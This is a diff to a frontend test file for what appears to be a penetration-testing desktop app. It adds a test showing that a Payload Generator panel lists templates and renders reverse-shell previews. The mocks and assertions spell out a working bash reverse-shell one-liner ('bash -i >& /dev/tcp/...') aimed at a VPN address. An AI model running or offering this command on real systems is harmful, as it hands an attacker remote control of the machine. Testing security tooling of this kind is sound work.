@@ -1247,8 +1247,8 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
       expect(await screen.findByText('Command Snippets')).toBeInTheDocument();
       expect(screen.getByText('Tail Nginx Logs')).toBeInTheDocument();
 
-      // 2. Click "+ New Snippet"
-      fireEvent.click(screen.getByRole('button', { name: /\+ New Snippet/i }));
+      // 2. Click "New Snippet"
+      fireEvent.click(screen.getByRole('button', { name: /^New Snippet$/i }));
       fireEvent.change(screen.getByPlaceholderText(/e\.g\. Inspect Nginx Logs/i), {
         target: { value: 'Ping Target Host' },
       });
@@ -3340,6 +3340,67 @@ describe('M0 & M1-1 Application Shell, Dark-Red Locked vs Teal Unlocked Theme, a
             port: 8000,
           })
         );
+      });
+    } finally {
+      delete (window as unknown as { go?: unknown }).go;
+    }
+  });
+
+  it('opens Payload Generator from the left sidebar, loads external templates, and renders payload previews', async () => {
+    const renderPayloadMock = vi.fn(async (opts: { templateId: string; lhost: string; lport: number }) => ({
+      templateId: opts.templateId,
+      rawCommand: 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1',
+      rendered: `bash -i >& /dev/tcp/${opts.lhost}/${opts.lport} 0>&1`,
+      encoding: 'none',
+      opsecWarnings: [],
+      resolvedVars: { LHOST: opts.lhost, LPORT: String(opts.lport) },
+    }));
+
+    (window as unknown as { go?: unknown }).go = {
+      main: {
+        App: {
+          GetAppStatus: async () => ({
+            vaultLocked: false,
+            vaultInitialized: true,
+            passwordless: true,
+            quickUnlockReady: false,
+          }),
+          GetVaultSummary: async () => ({ groups: [], hosts: [], identities: [] }),
+          ListPayloadTemplates: async () => [
+            {
+              id: 'tmpl-bash-tcp',
+              name: 'Bash Interactive Reverse',
+              os: 'linux',
+              shell: 'bash',
+              kind: 'reverse',
+              defaultPort: 443,
+              command: 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1',
+            },
+          ],
+          GetLocalNetworkIPs: async () => [
+            { interface: 'tun0', ip: '10.10.14.99', isVpn: true },
+          ],
+          RenderPayload: renderPayloadMock,
+        },
+      },
+    };
+
+    try {
+      render(<App initialLocked={false} />);
+
+      const payloadPanelBtn = screen.getByRole('button', { name: 'Payload Generator Panel' });
+      fireEvent.click(payloadPanelBtn);
+
+      expect(await screen.findByText('Bash Interactive Reverse')).toBeInTheDocument();
+      await waitFor(() => {
+        expect(screen.getByText('bash -i >& /dev/tcp/10.10.14.99/443 0>&1')).toBeInTheDocument();
+      });
+
+      const lportInput = screen.getByLabelText('Sidebar Payload LPORT');
+      fireEvent.change(lportInput, { target: { value: '8443' } });
+
+      await waitFor(() => {
+        expect(screen.getByText('bash -i >& /dev/tcp/10.10.14.99/8443 0>&1')).toBeInTheDocument();
       });
     } finally {
       delete (window as unknown as { go?: unknown }).go;
